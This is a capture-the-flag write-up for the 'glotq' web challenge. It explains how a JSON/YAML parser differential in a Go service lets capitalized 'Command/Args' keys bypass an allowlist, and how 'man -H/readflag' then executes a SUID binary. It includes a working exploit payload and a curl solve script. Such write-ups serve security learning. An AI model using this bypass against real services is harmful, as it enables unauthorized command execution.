# glotq

**Category:** web

---

#### Description

The service provides `jq`, `yq`, and `xq` “as a service” via three endpoints:

* `POST /json`
* `POST /yaml`
* `POST /xml`

Each request contains a JSON/YAML/XML object with fields like `command` and `args`, and the server executes that command.

#### Solution

The core bug is that the server parses the request twice using *different* rules:

1. **Security middleware** decides how to parse the body based on the HTTP `Content-Type` header.
2. **Handler** decides how to parse the body based on the *endpoint path* (`/json` always uses JSON parsing, etc.).

Additionally, Go’s `encoding/json` matches JSON object keys to struct fields/tags **case-insensitively**, while the YAML parser used (`gopkg.in/yaml.v3` with `yaml:"command"`) is effectively **case-sensitive** for those keys.

So we can send a request to `/json` with `Content-Type: application/yaml`:

* The middleware YAML-unmarshals the body and sees only lowercase `command/args`, so we make those look safe (`jq`) and pass the allowlist.
* The `/json` handler JSON-unmarshals the *same* body, and because JSON matching is case-insensitive, we can provide capitalized `Command/Args` that override the effective values used by the handler.

We then execute the SUID helper `/readflag` (present in the container) by abusing `man`’s HTML mode:

* `man -H<browser> <page>` runs `<browser>` to display the HTML output.
* Setting the browser to `/readflag` runs it and prints `/flag.txt`.

Exploit payload (send to `/json` while lying about `Content-Type`):

```json
{
  "command": "jq",
  "args": ["-n", "1"],
  "Command": "man",
  "Args": ["-H/readflag", "jq"]
}
```

One-shot solve script:

```bash
#!/usr/bin/env bash
set -euo pipefail

URL="https://glotq-gkche.instancer.lac.tf"  # replace with your instance

payload='{"command":"jq","args":["-n","1"],"Command":"man","Args":["-H/readflag","jq"]}'

curl -fsS "$URL/json" \
  -X POST \
  -H 'Content-Type: application/yaml' \
  --data-binary "$payload"
```

This returns the flag in the `output` field.
